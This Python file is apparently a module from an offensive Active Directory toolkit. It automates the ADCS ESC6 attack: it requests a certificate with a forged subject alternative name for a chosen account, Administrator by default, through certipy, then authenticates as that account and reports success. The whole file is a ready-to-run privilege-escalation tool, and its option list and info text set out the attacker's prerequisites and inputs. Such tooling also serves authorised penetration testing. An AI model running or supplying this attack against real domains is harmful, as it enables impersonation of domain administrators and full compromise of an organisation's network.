import os

from module import BaseModule
from tool import Tool

class ADCSESC6(BaseModule):
    name = "ADCS - ESC6"
    path = "adcs/esc6"
    description = "ESC6: CA Allows SAN Specification via Request Attributes"
    info = """If the CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set, any user who can enroll for a certificate can specify an arbitrary SAN. This makes any template that allows enrollment for domain computers/users vulnerable to a ESC1-like attack, even if the template itself isn't misconfigured.

Prerequisites:
  - The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set on the CA.
  - The attacker has enrollment rights on any template that allows client authentication."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "", "description": "ESC6 vulnerable template", "required": False},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": False},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.target_account)
    
        tool.title("Request the certificate with a malicious SAN (UPN and SID URL)")
        template = ['-template', self.opts.template] if self.opts.template != "" else []
        if not await tool.certipy_req(['-upn', f"{self.opts.target_account}@{self.opts.domain}"] + template + ['-out', pfx]):
            return

        tool.title("Authenticate as the target user with the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
